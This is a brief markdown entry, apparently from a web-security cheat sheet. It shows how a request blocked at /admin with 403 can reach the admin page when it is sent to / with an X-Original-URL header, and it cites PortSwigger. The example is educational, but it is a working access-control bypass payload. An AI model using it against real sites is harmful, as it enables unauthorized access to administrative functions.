# Access control

## Summary 
- [Access control](#access-control)
  - [Summary](#summary)
  - [Access control](#access-control-1)
  - [References](#references)

## Access control

:fire: **Example :**

***Request***
```bash
GET /admin HTTP/1.1
Host: website.com
```
***Response***
```bash
HTTP/1.1 403 Forbidden
...

"Access denied"
```
***Modified Request***

```bash
GET / HTTP/1.1
Host: website.com
X-Original-URL: /admin
```
***Response***
```bash
HTTP/1.1 200 OK
...

<!DOCTYPE html>
<html>
<head></head>
<body>"Admin Secrets"</body>
</html>
```

## References

 * [Portswigger](https://portswigger.net/web-security/access-control)